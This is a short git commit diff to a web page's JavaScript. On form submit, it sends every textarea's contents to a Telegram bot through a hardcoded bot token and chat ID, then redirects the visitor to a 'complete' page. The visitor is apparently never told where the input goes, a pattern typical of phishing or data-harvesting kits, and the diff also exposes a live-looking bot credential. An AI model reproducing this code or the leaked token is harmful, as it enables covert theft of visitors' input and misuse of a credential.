9d16cf8c274f6b4bbf459a5ca8a212688d496233
kvizhard777 <kvizhard.acc@gmail.com>
2023-05-06 13:06:41 +0500

    complete.html Added

--- js/main.js
+++ js/main.js
@@ -1,8 +1,9 @@
 const botToken = '5940079429:AAGr2UV2mQcI2x1cS2ZAUo6yQchd0S6Om7Y';
 const chatId = '2077802193';
 
+const form = document.getElementById('main-form');
+
 function sendTelegram() {
-    const form = document.getElementById('main-form');
     let message = '❗<b>Новые данные</b>\n\n';
 
     form.querySelectorAll('textarea').forEach((textarea, index) => {
@@ -15,4 +16,11 @@ function sendTelegram() {
     const encodedMessage = encodeURIComponent(message);
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=HTML&text=${encodedMessage}`);
+
+    window.location.href = 'complete.html';
 };
+
+form.addEventListener('submit', (event) => {
+    event.preventDefault();
+    sendTelegram();
+});
